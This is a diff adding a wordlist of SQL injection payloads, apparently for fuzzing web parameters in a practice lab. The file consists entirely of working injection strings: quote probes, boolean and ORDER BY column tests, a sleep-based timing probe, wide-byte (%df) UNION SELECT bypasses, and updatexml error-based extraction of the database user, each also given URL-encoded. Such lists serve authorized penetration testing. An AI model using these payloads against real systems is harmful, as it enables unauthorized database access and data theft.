@@ -1,0 +1,33 @@
+%27
+'
+%22
+/
+(
+)
+)'
+('
+(%22
+)%22
+lucy' #
+lucy' and sleep(5) #
+kobe%df' union select 1,2#
+kobe%df' or 1=1#
+and 1=1
+and 1=2
+and 1>2
+and order by 2
+and order by 3
++and+1=1
++and+1=2
+'  or  updatexml(1,concat(0x7e,user()),0)  or '
+and%201=1
+and%201=2
+and%201%3d1
+and%201%3d2
+and%201%3E2
+and%20order%20by%202
+and%20order%20by%203
++and+1%3d1
++and+1%3d2
+'%20%20or%20%20updatexml(1,concat(0x7e,user()),0)%20%20or%20'
+'%20%20or%20%20updatexml(1%2Cconcat(0x7e%2Cuser())%2C0)%20%20or%20'
